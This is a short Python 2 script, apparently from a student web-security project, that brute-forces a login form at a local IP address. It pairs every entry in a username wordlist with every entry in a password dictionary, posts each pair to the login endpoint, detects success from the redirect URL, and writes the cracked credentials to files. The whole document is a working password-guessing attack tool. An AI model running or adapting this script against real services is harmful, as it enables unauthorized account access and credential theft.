# -*- coding:utf-8 -*-
import requests
from file_tmp import crack_id, crack_pw

#import urllib
#from requests.auth import HTTPBasicAuth
#auth = HTTPBasicAuth('fake@example.com', 'not_a_real_password')
def request_force(f_id, f_pw):
    f_id="{}".format(f_id)
    f_pw="{}".format(f_pw)
    headers = {"User-Agent":"Mozilla/5.0"}
    url = "http://192.168.0.209:1111/login_chk"
    payload = {'user_pw':f_pw, 'user_id':f_id}
    r=requests.post(url, data=payload, headers=headers)#, auth=auth) #print r.history #b=urllib.request.urlopen(r.url) #b.read().decode("utf-8")            
    res = r.url
    count_fail=0
    if str(res).split("/")[3] == "login":
        #print "****failed****"        
        return "fail"
    elif str(res).split("/")[3] == "list":
        #print "****success****"        
        return f_id, f_pw
    pass 

if __name__ == "__main__":
    count=0
    file_name=''
    for x in crack_id('wl_id'):
        for y in crack_pw('dict_pass'):
            count+=1
            print count
            if request_force(f_id=x, f_pw=y) is not "fail":                
                print "총 {}회 시도 [ID: {} ] [PW: {} ]".format(count, request_force(f_id=x, f_pw=y)[0], request_force(f_id=x, f_pw=y)[1])
                f = open("C:/Users/student/Desktop/web_final_project/crack_code1022/result%s.txt" % count, "w+")
                data = "총 {}회 시도 [ID: {} ] [PW: {} ]".format(count, request_force(f_id=x, f_pw=y)[0], request_force(f_id=x, f_pw=y)[1])                
                f.write(data)
                f.close()
                
                
#print r.status_code
#print r.text




